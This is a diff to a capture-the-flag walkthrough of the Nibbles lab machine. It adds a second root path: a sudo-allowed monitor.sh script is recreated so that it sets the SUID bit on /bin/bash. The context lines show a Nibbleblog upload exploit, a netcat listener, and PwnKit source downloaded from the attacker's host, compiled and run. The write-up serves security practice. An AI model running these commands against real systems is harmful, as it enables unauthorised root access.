@@ -14,7 +14,8 @@ categories:
   - Easy
 tags:
   - Abusing Nibbleblog - Remote Code Execution via File Upload
-  - Abusing Sudoers Privilege [Privilege Escalation]
+  - SUID Binary Exploitation [Privilege Escalation] (OPTION 1)
+  - Abusing Sudoers Privilege [Privilege Escalation] (OPTION 2)
 ---
 
 
@@ -189,7 +190,7 @@ python3 exploit.py -t http://10.10.10.75/nibbleblog/admin.php -u admin -p nibble
 nc -nlvp 9000
 ```
 
-## Post-exploitation
+## Post-exploitation (OPTION 1)
 
 - Find sudoers
 
@@ -210,6 +211,32 @@ python3 -m http.server
 wget http://10.10.16.7/PwnKit.c
 gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
 ./PwnKit
+```
+
+## Post-exploitation (OPTION 2)
+
+- Check sudoers
+
+```bash
+sudo -l
+```
+
+![](/img2/Pasted%20image%2020250601173610.png)
+
+- Check /home/nibbler/personal/stuff/monitor.sh file
+
+```bash
+cat /home/nibbler/personal/stuff/monitor.sh
+```
+
+![](/img2/Pasted%20image%2020250601173714.png)
+
+> No such file
+
+- Create monitor.sh
+
+```bash
+mkdir -p /home/nibbler/personal/stuff && echo "chmod u+s /bin/bash" > /home/nibbler/personal/stuff/monitor.sh && chmod +x /home/nibbler/personal/stuff/monitor.sh && sudo /home/nibbler/personal/stuff/monitor.sh && bash -p
 ```
 
 
